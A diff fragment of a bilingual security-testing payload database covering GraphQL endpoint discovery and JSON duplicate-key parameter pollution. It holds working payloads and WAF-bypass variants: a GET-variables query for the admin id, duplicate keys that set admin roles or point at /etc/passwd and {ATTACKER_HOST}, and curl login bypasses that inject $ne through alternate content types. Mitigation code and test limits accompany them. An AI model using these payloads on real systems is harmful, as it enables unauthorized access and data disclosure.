+                "en": "Well-known path"
+              },
+              "type": "url"
+            },
+            {
+              "part": "/console/graphiql",
+              "explanation": {
+                "zh": "备用控制台路径",
+                "en": "Alternate console path"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "GET variables 通道内省/越权查询",
+            "en": "GET Variables Channel Introspection and Authz Query"
+          },
+          "command": "curl -sS --max-time 5 \"http://{TARGET}/graphql?query=query(%24u%3AString!){user(username%3A%24u){id}}&variables=%7B%22u%22%3A%22admin%22%7D\"",
+          "description": {
+            "zh": "单条 GET 请求同时以查询参数传入 query 与 variables，variables 为 URL 编码 JSON {\"u\":\"admin\"}，查询按用户名取 id。判据：variables 以 JSON 查询参数传入且查询成功返回目标账号 id，证明服务端实现了 GET 变量通道；仅审计 POST body 的 WAF 与限速对 GET 通道完全失效。成立条件：服务端支持 GET+variables（Apollo Server、graphql-http 默认开启）。成功判据：响应返回 admin 账号的 id。",
+            "en": "A single GET request carries both the query and the variables parameter, the latter being URL-encoded JSON selecting username admin, and the query fetches that account id. A successful response returning the target account id proves the server implements the GET variables channel, which WAF rules and rate limiters inspecting only POST bodies never see. Preconditions: the backend honors GET requests with variables, enabled by default on Apollo Server and graphql-http. Success: the response contains the admin account id."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "query(%24u%3AString!){user(username%3A%24u){id}}",
+              "explanation": {
+                "zh": "带变量的参数化查询：$u 声明为 String! 并注入 username 参数",
+                "en": "Parameterized query declaring $u as String! and injecting it into the username argument"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "variables=%7B%22u%22%3A%22admin%22%7D",
+              "explanation": {
+                "zh": "URL 编码的 JSON 变量体，落在仅检查 POST body 的检测面之外",
+                "en": "URL-encoded JSON variable body landing outside inspection surfaces that watch only POST bodies"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "建立路由回退对照",
+            "en": "Establish route-fallback controls"
+          },
+          "description": {
+            "zh": "用随机不存在路径、普通 API 和静态页面记录状态码、内容类型及响应指纹。",
+            "en": "Use a random nonexistent path, ordinary API, and static page to record status, content type, and response fingerprints."
+          }
+        },
+        {
+          "title": {
+            "zh": "枚举并确认 GraphQL 协议",
+            "en": "Enumerate and confirm GraphQL protocol"
+          },
+          "description": {
+            "zh": "回放原始路径集合并对候选发送最小查询，验证 data/errors 与 GraphQL Content-Type。",
+            "en": "Replay the original path set and send a minimal query to candidates, verifying data or errors and GraphQL content type."
+          },
+          "payload": "/graphql\n/graphiql\n/v1/graphql\n/v2/graphql\n/api/graphql\n/api/v1/graphql\n/api/v2/graphql\n/query\n/api/query\n/gql\n/api/gql\n/graph\n/api/graph\n/graphql/console\n/graphql/voyager\n/graphql/playground\n/graphql/altair\n/graphql/explorer\n/graphql/schema\n/graphql/schema.json\n/graphql/schema.graphql\n/graphql/schema.sdl\n/graphql/introspection\n/graphql/__schema\n/graphql/__type\n/graphql?query={__schema{types{name}}}\n/graphql?query={__type(name:\"Query\"){fields{name}}}\n/graphql?query={__type(name:\"Mutation\"){fields{name}}}\n/graphql?query={__type(name:\"Subscription\"){fields{name}}}"
+        },
+        {
+          "title": {
+            "zh": "验证身份与字段边界",
+            "en": "Verify identity and field boundaries"
+          },
+          "description": {
+            "zh": "以匿名和低权限身份比较 Schema、控制台与字段访问，修复暴露后保留业务查询回归。",
+            "en": "Compare schema, console, and field access anonymously and with low privilege, then preserve business-query regressions after remediation."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "该 Payload 覆盖 GraphQL 攻击面发现场景，检验端点、控制台与 Schema 路径的暴露范围。验证维度为常见 API 与调试路径的探测矩阵，对应第 1 步。",
+          "en": "This payload covers GraphQL attack-surface discovery, testing exposure of endpoints, consoles and schema paths. Validation is a probing matrix of common API and debug paths, mapped to step 1."
+        },
+        "vulnerability": {
+          "zh": "根因在于 GraphQL 服务常部署在非标准路径且调试界面未随生产关闭：可发现端点配合开放内省即交出完整数据结构，攻击面直接成型。",
+          "en": "The root cause is GraphQL services deployed on nonstandard paths with debug consoles left open in production: a discoverable endpoint plus open introspection hands over the complete data structure, forming the attack surface outright."
+        },
+        "exploitation": {
+          "zh": "第 1 步按脚本逐条探测 API、控制台与 Schema 路径并记录响应特征：返回 GraphQL 错误结构或 playground 页面即确认端点存活，对每个存活端点再发一个最小查询确认可用性。成功判据以存活端点矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, probe API, console and schema paths one by one per the script, recording response signatures; GraphQL error structures or playground pages confirm live endpoints, then send a minimal query to each to confirm usability. Judge success by the live-endpoint matrix. Replace placeholders via the global variables menu."
+        },
+        "mitigation": {
+          "zh": "生产环境关闭调试控制台与内省，端点收敛到统一路径并由认证保护，未认证请求返回通用错误。\n    const { ApolloServer, ApolloServerPluginLandingPageDisabled } =\n          require('apollo-server-core');\n    const server = new ApolloServer({\n      typeDefs, resolvers,\n      introspection: false,  // 生产禁用内省\n      plugins: [ApolloServerPluginLandingPageDisabled()],  // 下线控制台\n    });",
+          "en": "Close debug consoles in production and consolidate endpoints to one path, returning generic errors for unauthenticated requests. After the fix, replay step 1: console paths should be unreachable and signature responses gone."
+        },
+        "difficulty": "beginner"
+      },
+      "analysis": {
+        "zh": "阳性证据是候选路径实际解析 GraphQL 文档并返回符合规范的 data/errors 或由服务端 GraphQL handler 记录；控制台发现单独标记。 假阳性边界：路径返回 200 HTML、SPA fallback、Swagger/GraphiQL 静态资源、WAF JSON、404 差异、OPTIONS/CORS 或名称含 graphql 均不能确认 API。",
+        "en": "Positive evidence requires a candidate path to parse a GraphQL document and return specification-shaped data or errors or be logged by the server's GraphQL handler; console discovery is labeled separately. False-positive boundary: An HTTP 200 HTML page, SPA fallback, Swagger or GraphiQL static assets, WAF JSON, 404 differences, OPTIONS or CORS, or graphql in a name does not confirm an API."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选7 追加 GET variables 通道内省/越权查询 变体（原 3 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "httpbypass-json-body",
+      "name": {
+        "zh": "JSON 重复键解析差异",
+        "en": "JSON Duplicate-Key Parsing Differential"
+      },
+      "description": {
+        "zh": "使用同名 JSON 键的冲突值检查网关、校验器和业务解析器是否选择不同值并造成授权偏差。",
+        "en": "Uses conflicting duplicate JSON keys to test whether gateways, validators, and business parsers choose different values and create authorization discrepancies."
+      },
+      "category": {
+        "zh": "API安全",
+        "en": "API Security"
+      },
+      "subCategory": {
+        "zh": "参数污染与输入解释差异",
+        "en": "Parameter Pollution & Input Interpretation Divergence"
+      },
+      "tags": [
+        "httpbypass",
+        "json_body"
+      ],
+      "prerequisites": [
+        {
+          "zh": "使用可观测测试 API，记录原始 JSON 字节及网关、schema validator、框架和业务层各自的重复键选值策略。",
+          "en": "Use an observable test API and record raw JSON bytes and duplicate-key selection at gateway, schema validator, framework, and business layers."
+        },
+        {
+          "zh": "为同一无害 canary 字段准备单键、同值重复、冲突先后顺序和严格拒绝对照，认证主体保持不变。",
+          "en": "Prepare single-key, same-value duplicate, conflicting order, and strict-rejection controls for one harmless canary field while keeping the principal fixed."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "JSON 重复键参数污染",
+            "en": "Validation step 1 for JSON Duplicate-Key Parsing Differential"
+          },
+          "command": "{\"id\":1,\"id\":2}\n{\"user\":\"admin\",\"user\":\"guest\"}\n{\"role\":\"user\",\"role\":\"admin\"}\n{\"type\":\"normal\",\"type\":\"admin\"}\n{\"level\":1,\"level\":999}\n{\"group\":\"users\",\"group\":\"admins\"}\n{\"permission\":\"read\",\"permission\":\"all\"}\n{\"admin\":false,\"admin\":true}\n{\"is_admin\":false,\"is_admin\":true}\n{\"is_administrator\":false,\"is_administrator\":true}\n{\"privilege\":\"low\",\"privilege\":\"high\"}\n{\"status\":\"inactive\",\"status\":\"active\"}\n{\"state\":\"pending\",\"state\":\"approved\"}\n{\"action\":\"view\",\"action\":\"delete\"}\n{\"cmd\":\"ls\",\"cmd\":\"id\"}\n{\"command\":\"ls\",\"command\":\"id\"}\n{\"exec\":\"ls\",\"exec\":\"id\"}\n{\"run\":\"ls\",\"run\":\"id\"}\n{\"eval\":\"ls\",\"eval\":\"id\"}\n{\"file\":\"test\",\"file\":\"/etc/passwd\"}\n{\"path\":\"test\",\"path\":\"/etc/passwd\"}\n{\"url\":\"test\",\"url\":\"http://{ATTACKER_HOST}\"}\n{\"redirect\":\"/home\",\"redirect\":\"http://{ATTACKER_HOST}\"}\n{\"return\":\"/home\",\"return\":\"http://{ATTACKER_HOST}\"}\n{\"callback\":\"/home\",\"callback\":\"http://{ATTACKER_HOST}\"}\n{\"next\":\"/home\",\"next\":\"http://{ATTACKER_HOST}\"}\n{\"dest\":\"/home\",\"dest\":\"http://{ATTACKER_HOST}\"}\n{\"destination\":\"/home\",\"destination\":\"http://{ATTACKER_HOST}\"}\n{\"target\":\"/home\",\"target\":\"http://{ATTACKER_HOST}\"}\n{\"link\":\"/home\",\"link\":\"http://{ATTACKER_HOST}\"}\n{\"href\":\"/home\",\"href\":\"http://{ATTACKER_HOST}\"}\n{\"src\":\"/home\",\"src\":\"http://{ATTACKER_HOST}\"}\n{\"source\":\"/home\",\"source\":\"http://{ATTACKER_HOST}\"}\n{\"page\":\"home\",\"page\":\"/etc/passwd\"}\n{\"template\":\"home\",\"template\":\"/etc/passwd\"}\n{\"view\":\"home\",\"view\":\"/etc/passwd\"}\n{\"layout\":\"home\",\"layout\":\"/etc/passwd\"}\n{\"theme\":\"default\",\"theme\":\"/etc/passwd\"}\n{\"lang\":\"en\",\"lang\":\"/etc/passwd\"}\n{\"locale\":\"en\",\"locale\":\"/etc/passwd\"}\n{\"format\":\"html\",\"format\":\"/etc/passwd\"}\n{\"type\":\"normal\",\"type\":\"/etc/passwd\"}\n{\"kind\":\"normal\",\"kind\":\"/etc/passwd\"}\n{\"class\":\"normal\",\"class\":\"/etc/passwd\"}\n{\"style\":\"default\",\"style\":\"/etc/passwd\"}",
+          "description": {
+            "zh": "把重复键 JSON 逐条提交解析端点；网关/校验层与业务解析层选择了不同键值并造成可观察的行为或授权差异，即确认 JSON 重复键解析差异。",
+            "en": "Submit each duplicate-key JSON to the parsing endpoint; server values disagreeing with the expected key order confirms JSON parsing differentials."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"id\":1,\"id\":2}",
+              "explanation": {
+                "zh": "重复 id 键",
+                "en": "Duplicate id keys"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"user\":\"admin\",\"user\":\"guest\"}",
+              "explanation": {
+                "zh": "重复 user 键",
+                "en": "Duplicate user keys"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"role\":\"user\",\"role\":\"admin\"}",
+              "explanation": {
+                "zh": "重复 role 键",
+                "en": "Duplicate role keys"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"file\":\"test\",\"file\":\"/etc/passwd\"}",
+              "explanation": {
+                "zh": "重复 file 键",
+                "en": "Duplicate file keys"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"url\":\"test\",\"url\":\"http://{ATTACKER_HOST}\"}",
+              "explanation": {
+                "zh": "重复 url 键",
+                "en": "Duplicate url keys"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "一个无害字段首次出现跨层选值差异后停止，不使用权限、命令或路径字段扩大影响。",
+          "en": "Stop after one harmless field first shows cross-tier value selection; do not expand into privilege, command, or path fields."
+        },
+        {
+          "zh": "回滚 canary，删除原始请求和解析 trace，清除 schema 缓存并恢复入口拒绝重复键或统一解析。",
+          "en": "Roll back the canary, delete raw requests and parser traces, clear schema caches, and restore ingress rejection of duplicate keys or one consistent parser."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "嵌套对象覆盖",
+            "en": "Nested Object Override"
+          },
+          "command": "{\"user\":{\"id\":1,\"role\":\"admin\"},\"user\":\"guest\"}\n{\"data\":{\"id\":1},\"id\":2}",
+          "description": {
+            "zh": "嵌套与平铺同名键在不同层取值不同。成功判据：执行层取到 admin 值。",
+            "en": "Nested and flat same-name keys resolve differently per layer. Success: the execution layer reads the admin value."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"user\":{\"id\":1,\"role\":\"admin\"},\"user\":\"guest\"}",
+              "explanation": {
+                "zh": "嵌套与平铺同名键",
+                "en": "Nested vs flat same key"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"data\":{\"id\":1},\"id\":2}",
+              "explanation": {
+                "zh": "嵌套 id 覆盖",
+                "en": "Nested id override"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "数组键混淆",
+            "en": "Array-Key Confusion"
+          },
+          "command": "{\"id\":[1,2]}\n{\"user\":[\"admin\",\"guest\"],\"role\":[\"user\",\"admin\"]}",
+          "description": {
+            "zh": "数组形态使各层取首/尾元素不一致。成功判据：越权值被采信。",
+            "en": "Array forms make layers disagree on first/last elements. Success: the unauthorized value is honored."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"id\":[1,2]}",
+              "explanation": {
+                "zh": "数组双元素 id",
+                "en": "Array two-element id"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"user\":[\"admin\",\"guest\"],\"role\":[\"user\",\"admin\"]}",
+              "explanation": {
+                "zh": "数组身份与角色",
+                "en": "Array identity and role"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "Unicode 转义重复键",
+            "en": "Unicode-Escaped Duplicate Keys"
+          },
+          "command": "{\"\\u0072ole\":\"user\",\"role\":\"admin\"}\n{\"\\u0069d\":1,\"id\":2}",
+          "description": {
+            "zh": "Unicode 转义键解码后与明文键同名，部分解析器视为两个不同键同时保留，校验层与业务层可能各取其一实现覆盖。成功判据：后键覆盖生效。",
+            "en": "Escaped and plaintext keys collide after parsing, enabling overrides. Success: the later key wins."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"\\u0072ole\":\"user\",\"role\":\"admin\"}",
+              "explanation": {
+                "zh": "转义键同名覆盖",
+                "en": "Escaped-key override"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"\\u0069d\":1,\"id\":2}",
+              "explanation": {
+                "zh": "转义 id 键覆盖",
+                "en": "Escaped id override"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "JSON↔表单双解析差分",
+            "en": "JSON and Form Dual-Parsing Differential"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/api/login -H \"Content-Type: application/x-www-form-urlencoded\" --data 'user=admin&pass={\"$ne\":\"\"}'\ncurl -sS --max-time 5 -X POST http://{TARGET}/api/login -H \"Content-Type: text/plain\" --data '{\"user\":{\"$ne\":\"\"},\"pass\":{\"$ne\":\"\"}}'",
+          "description": {
+            "zh": "同一登录端点分别以表单与 text/plain 载体提交对象型条件：表单行把 $ne 操作符注入 pass 值，text/plain 行整包 JSON 提交。判据：认证被绕过而 JSON 载体此前被拦，即确认 Content-Type 解析差分；若三类载体一致拒绝，证明入口统一走严格 schema 校验。成立条件：后端按 Content-Type 多态解析且无严格 schema。成功判据：表单或 text/plain 行登录成功而 application/json 行被拦。",
+            "en": "The same login endpoint receives object-shaped conditions through two alternate carriers: the form line injects the $ne operator into the pass value, and the text/plain line submits the whole JSON document. Login succeeding while the JSON carrier was blocked confirms the Content-Type parsing differential; all three carriers being rejected uniformly shows the entry point enforces strict schema validation. Preconditions: backend parsing polymorphic by Content-Type with no strict schema. Success: the form or text/plain line authenticates while the application/json line stays blocked."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "--data 'user=admin&pass={\"$ne\":\"\"}'",
+              "explanation": {
+                "zh": "表单载体：pass 值内嵌 JSON 片段，多态解析器按对象条件解释",
+                "en": "Form carrier with a JSON fragment inside the pass value that polymorphic parsing reads as an object condition"
+              },
+              "type": "value"
+            },
+            {
+              "part": "-H \"Content-Type: text/plain\"",
+              "explanation": {
+                "zh": "声明 text/plain 的整包 JSON，绕开 application/json 专属规则",
+                "en": "Whole JSON body declared as text/plain to dodge application/json specific rules"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "建立JSON 参数污染基线",
+            "en": "Establish the JSON Parameter Pollution baseline"
+          },
+          "description": {
+            "zh": "对单一合法键值和单一非法键值分别记录网关、应用与数据库接收结果，并保存原始请求、响应与服务端关联标识。",
+            "en": "Record gateway, application, and database outcomes for one valid key value and one invalid key value, retaining raw requests, responses, and server correlation identifiers."
+          },
+          "payload": "{\"id\":1,\"id\":2}\n{\"user\":\"admin\",\"user\":\"guest\"}\n{\"role\":\"user\",\"role\":\"admin\"}\n{\"type\":\"normal\",\"type\":\"admin\"}\n{\"level\":1,\"level\":999}\n{\"group\":\"users\",\"group\":\"admins\"}\n{\"permission\":\"read\",\"permission\":\"all\"}\n{\"admin\":false,\"admin\":true}\n{\"is_admin\":false,\"is_admin\":true}\n{\"is_administrator\":false,\"is_administrator\":true}\n{\"privilege\":\"low\",\"privilege\":\"high\"}\n{\"status\":\"inactive\",\"status\":\"active\"}\n{\"state\":\"pending\",\"state\":\"approved\"}\n{\"action\":\"view\",\"action\":\"delete\"}\n{\"cmd\":\"ls\",\"cmd\":\"id\"}\n{\"command\":\"ls\",\"command\":\"id\"}\n{\"exec\":\"ls\",\"exec\":\"id\"}\n{\"run\":\"ls\",\"run\":\"id\"}\n{\"eval\":\"ls\",\"eval\":\"id\"}\n{\"file\":\"test\",\"file\":\"/etc/passwd\"}\n{\"path\":\"test\",\"path\":\"/etc/passwd\"}\n{\"url\":\"test\",\"url\":\"http://{ATTACKER_HOST}\"}\n{\"redirect\":\"/home\",\"redirect\":\"http://{ATTACKER_HOST}\"}\n{\"return\":\"/home\",\"return\":\"http://{ATTACKER_HOST}\"}\n{\"callback\":\"/home\",\"callback\":\"http://{ATTACKER_HOST}\"}\n{\"next\":\"/home\",\"next\":\"http://{ATTACKER_HOST}\"}\n{\"dest\":\"/home\",\"dest\":\"http://{ATTACKER_HOST}\"}\n{\"destination\":\"/home\",\"destination\":\"http://{ATTACKER_HOST}\"}\n{\"target\":\"/home\",\"target\":\"http://{ATTACKER_HOST}\"}\n{\"link\":\"/home\",\"link\":\"http://{ATTACKER_HOST}\"}\n{\"href\":\"/home\",\"href\":\"http://{ATTACKER_HOST}\"}\n{\"src\":\"/home\",\"src\":\"http://{ATTACKER_HOST}\"}\n{\"source\":\"/home\",\"source\":\"http://{ATTACKER_HOST}\"}\n{\"page\":\"home\",\"page\":\"/etc/passwd\"}\n{\"template\":\"home\",\"template\":\"/etc/passwd\"}\n{\"view\":\"home\",\"view\":\"/etc/passwd\"}\n{\"layout\":\"home\",\"layout\":\"/etc/passwd\"}\n{\"theme\":\"default\",\"theme\":\"/etc/passwd\"}\n{\"lang\":\"en\",\"lang\":\"/etc/passwd\"}\n{\"locale\":\"en\",\"locale\":\"/etc/passwd\"}\n{\"format\":\"html\",\"format\":\"/etc/passwd\"}\n{\"type\":\"normal\",\"type\":\"/etc/passwd\"}\n{\"kind\":\"normal\",\"kind\":\"/etc/passwd\"}\n{\"class\":\"normal\",\"class\":\"/etc/passwd\"}\n{\"style\":\"default\",\"style\":\"/etc/passwd\"}"
+        },
+        {
+          "title": {
+            "zh": "执行JSON 参数污染变体",
+            "en": "Execute the JSON Parameter Pollution variants"
+          },
+          "description": {
+            "zh": "逐项发送原始重复键 JSON，保持字段顺序可见并记录每层解析后的对象，严格保持其他变量不变并设置停止阈值。",
+            "en": "Send original duplicate-key JSON items one at a time, preserving field order and recording the object parsed at each layer, holding all other variables constant and defining a stop threshold."
+          },
+          "payload": "{\"id\":1,\"id\":2}\n{\"user\":\"admin\",\"user\":\"guest\"}\n{\"role\":\"user\",\"role\":\"admin\"}\n{\"type\":\"normal\",\"type\":\"admin\"}\n{\"level\":1,\"level\":999}\n{\"group\":\"users\",\"group\":\"admins\"}\n{\"permission\":\"read\",\"permission\":\"all\"}\n{\"admin\":false,\"admin\":true}\n{\"is_admin\":false,\"is_admin\":true}\n{\"is_administrator\":false,\"is_administrator\":true}\n{\"privilege\":\"low\",\"privilege\":\"high\"}\n{\"status\":\"inactive\",\"status\":\"active\"}\n{\"state\":\"pending\",\"state\":\"approved\"}\n{\"action\":\"view\",\"action\":\"delete\"}\n{\"cmd\":\"ls\",\"cmd\":\"id\"}\n{\"command\":\"ls\",\"command\":\"id\"}\n{\"exec\":\"ls\",\"exec\":\"id\"}\n{\"run\":\"ls\",\"run\":\"id\"}\n{\"eval\":\"ls\",\"eval\":\"id\"}\n{\"file\":\"test\",\"file\":\"/etc/passwd\"}\n{\"path\":\"test\",\"path\":\"/etc/passwd\"}\n{\"url\":\"test\",\"url\":\"http://{ATTACKER_HOST}\"}\n{\"redirect\":\"/home\",\"redirect\":\"http://{ATTACKER_HOST}\"}\n{\"return\":\"/home\",\"return\":\"http://{ATTACKER_HOST}\"}\n{\"callback\":\"/home\",\"callback\":\"http://{ATTACKER_HOST}\"}\n{\"next\":\"/home\",\"next\":\"http://{ATTACKER_HOST}\"}\n{\"dest\":\"/home\",\"dest\":\"http://{ATTACKER_HOST}\"}\n{\"destination\":\"/home\",\"destination\":\"http://{ATTACKER_HOST}\"}\n{\"target\":\"/home\",\"target\":\"http://{ATTACKER_HOST}\"}\n{\"link\":\"/home\",\"link\":\"http://{ATTACKER_HOST}\"}\n{\"href\":\"/home\",\"href\":\"http://{ATTACKER_HOST}\"}\n{\"src\":\"/home\",\"src\":\"http://{ATTACKER_HOST}\"}\n{\"source\":\"/home\",\"source\":\"http://{ATTACKER_HOST}\"}\n{\"page\":\"home\",\"page\":\"/etc/passwd\"}\n{\"template\":\"home\",\"template\":\"/etc/passwd\"}\n{\"view\":\"home\",\"view\":\"/etc/passwd\"}\n{\"layout\":\"home\",\"layout\":\"/etc/passwd\"}\n{\"theme\":\"default\",\"theme\":\"/etc/passwd\"}\n{\"lang\":\"en\",\"lang\":\"/etc/passwd\"}\n{\"locale\":\"en\",\"locale\":\"/etc/passwd\"}\n{\"format\":\"html\",\"format\":\"/etc/passwd\"}\n{\"type\":\"normal\",\"type\":\"/etc/passwd\"}\n{\"kind\":\"normal\",\"kind\":\"/etc/passwd\"}\n{\"class\":\"normal\",\"class\":\"/etc/passwd\"}\n{\"style\":\"default\",\"style\":\"/etc/passwd\"}"
+        },
+        {
+          "title": {
+            "zh": "核验JSON 重复键解析差异证据",
+            "en": "Verify evidence for JSON Duplicate-Key Parsing Differential"
+          },
+          "description": {
+            "zh": "证明安全层与业务层选择不同值，并由最终状态或授权结果体现可观察影响；同时排除解析器统一拒绝、仅日志保留双键或响应回显原始正文。",
+            "en": "Prove that the security and business layers select different values and that final state or authorization shows observable impact; also exclude Uniform parser rejection, duplicate keys preserved only in logs, or raw-body reflection."
+          },
+          "payload": "{\"id\":[1,2]}\n{\"user\":[\"admin\",\"guest\"],\"role\":[\"user\",\"admin\"]}"
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "该 Payload 覆盖 JSON 重复键解析差异场景，检验网关、校验器与业务解析器对同名键的取值分歧。验证维度为身份、角色与等级重复键的提交矩阵，对应第 1 步。",
+          "en": "This payload covers JSON duplicate-key parsing divergence, testing value-selection disagreements on same-name keys across gateway, validator and business parsers. Validation is a submission matrix of identity, role and level duplicate keys, mapped to step 1."
+        },
+        "vulnerability": {
+          "zh": "根因在于各解析器对重复键采用首值、末值或合并策略且互不一致：校验通过的值与业务实际使用的值可被构造为不同，授权判定随之失真。",
+          "en": "The root cause is parsers differing on first-value, last-value or merge strategies for duplicate keys: the validated value can differ from the one business logic uses, distorting authorization decisions."
+        },
+        "exploitation": {
+          "zh": "第 1 步按脚本把含重复键的 JSON 逐条提交解析端点，记录服务端实际采用的值与校验层结论：两侧不一致且非预期值生效即确认解析差异可利用，定位分歧所属层。成功判据以业务层实际取值为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, submit duplicate-key JSON bodies to parsing endpoints one by one per the script, recording values the server actually adopts versus validator conclusions; divergent values with unexpected ones winning confirm exploitable parsing divergence, pinpointing the disagreeing layer. Judge success by the business layer's actual value. Replace placeholders via the global variables menu."
+        },
+        "mitigation": {
+          "zh": "全链路统一 JSON 解析器配置并在入口拒绝重复键，业务读取与校验复用同一解析结果。\n    JsonFactory f = JsonFactory.builder()\n        .enable(JsonReadFeature.STRICT_DUPLICATE_DETECTION)\n        .build();\n    ObjectMapper om = new ObjectMapper(f);  // 重复键直接抛异常\n  修复后重放验证第 1 步矩阵，含重复键请求应直接被拒绝。",
+          "en": "Standardize JSON parser settings across the chain and reject duplicate keys at ingress, with validation and business reads sharing one parse result. After the fix, replay the step 1 matrix: duplicate-key requests should be refused outright."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "阳性要求安全层验证一个值而业务层消费另一个冲突值，并因此改变 canary 或授权结果，逐层解析 trace 可证明差异。JSON 语法被接受、最后值获胜且所有层一致、返回 400、正文回显、日志只保留一个值、admin 文本出现但主体不变都不是可利用重复键污染。",
+        "en": "Positive evidence requires a security tier to validate one value while the business tier consumes the conflicting one and changes the canary or authorization result, proven by per-tier parsing traces. JSON acceptance, consistent last-value behavior across all tiers, HTTP 400, body reflection, one value in logs, or admin text without principal change is not exploitable duplicate-key pollution."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选8 追加 JSON↔表单双解析差分 变体（原 3 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    }
+  ]
+}
